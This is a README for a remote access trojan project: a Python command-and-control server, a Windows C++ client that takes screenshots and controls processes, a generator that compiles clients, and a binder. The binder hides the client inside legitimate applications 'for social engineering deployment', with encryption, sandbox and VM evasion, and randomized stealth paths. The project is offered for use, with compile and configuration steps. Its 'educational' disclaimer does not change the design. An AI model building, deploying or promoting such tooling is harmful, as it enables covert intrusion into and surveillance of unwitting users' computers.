# Remote Access Tool (RAT)

```
██████╗  █████╗ ████████╗ █████╗ ████████╗ ██████╗ ██╗   ██╗██╗     ██╗     ███████╗
██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗╚══██╔══╝██╔═══██╗██║   ██║██║     ██║     ██╔════╝
██████╔╝███████║   ██║   ███████║   ██║   ██║   ██║██║   ██║██║     ██║     █████╗
██╔══██╗██╔══██║   ██║   ██╔══██║   ██║   ██║   ██║██║   ██║██║     ██║     ██╔══╝
██║  ██║██║  ██║   ██║   ██║  ██║   ██║   ╚██████╔╝╚██████╔╝██║███████╗███████╗███████╗
╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚═╝╚══════╝╚══════╝╚══════╝
```

A simple client-server remote access tool with basic monitoring capabilities.

## Components

This project consists of three main components:

- Python RAT Server: Command and control server
- C++ RAT Client: Client application that connects to the server
- RAT Client Generator: Tool to customize and compile client executables
- RAT Client Binder: Tool to bind RAT client with legitimate applications

## Python RAT Server

### Requirements

- Python 3.6+
- colorama package

### Installation

```bash
pip install -r requirements.txt
```

### Usage

```bash
python python_rat_server.py
```

### Features

- Interactive menu-based interface
- Support for multiple client connections
- Client management (list, select, disconnect)
- System information retrieval
- Process management (list, start, terminate processes)
- Screenshot capture
- Server configuration options

### Commands

- `start` - Start the server
- `stop` - Stop the server
- `list` - List all connected clients
- `select <id>` - Select a client to interact with
- `kill <id>` - Force terminate a client session
- `sysinfo` - Get detailed system information from selected client
- `procinfo` - Get process information from selected client
- `list_processes` - List all running processes on selected client
- `start_process <cmd>` - Start a new process on selected client
- `terminate_process <pid>` - Terminate a process on selected client
- `screenshot` - Capture and download screenshot from client
- `exit` - Close connection with selected client
- `clear` - Clear the screen
- `options` - Configure server options
- `quit` - Exit the program

## C++ RAT Client

### Requirements

- Windows operating system
- C++11 compatible compiler (MinGW-w64 or Visual C++)
- Windows Socket API (WinSock2)
- Windows API
- GDI+ (Graphics Device Interface)
- OLE32 (Component Object Model)

### Compilation

```bash
g++ -o Warp.exe rat_client.cpp -lws2_32 -lgdi32 -lole32 -lgdiplus -DUNICODE -D_UNICODE
```

### Configuration

Before running the client, edit the `rat_client.cpp` file which is in the Rat_Client_Generator folder to set the server IP address:

```cpp
#define SERVER_IP "127.0.0.1" // Change to your server IP
```

### Features

- Automatic connection and reconnection to server
- System information collection
- Process management capabilities
- Screenshot capability

## RAT Client Generator

### Requirements

- Python 3.6+
- colorama package
- MinGW-w64 compiler

### Usage

```bash
python rat_client_generator.py
```

### Features

- Customizes and compiles RAT client with specified settings
- Configurable server IP and port
- Custom output filename

## RAT Client Binder

### Requirements

- Python 3.6+
- colorama package
- MinGW-w64 compiler

### Usage

```bash
python binder.py
```

### Features

- Binds RAT client with legitimate applications
- Creates a single executable that runs both the legitimate app and the RAT client
- Helps with social engineering deployment
- Automatically extracts and executes both applications
- Uses encryption to obfuscate the RAT client
- Implements sandbox/VM detection to avoid analysis environments
- Creates randomized file paths for stealth operation

## Security Notice

This tool is intended for educational purposes and legitimate system administration only. Unauthorized access to computer systems is illegal and unethical. Use responsibly and only on systems you own or have permission to access.

## License

This project is licensed under the MIT License - see the LICENSE file for details.

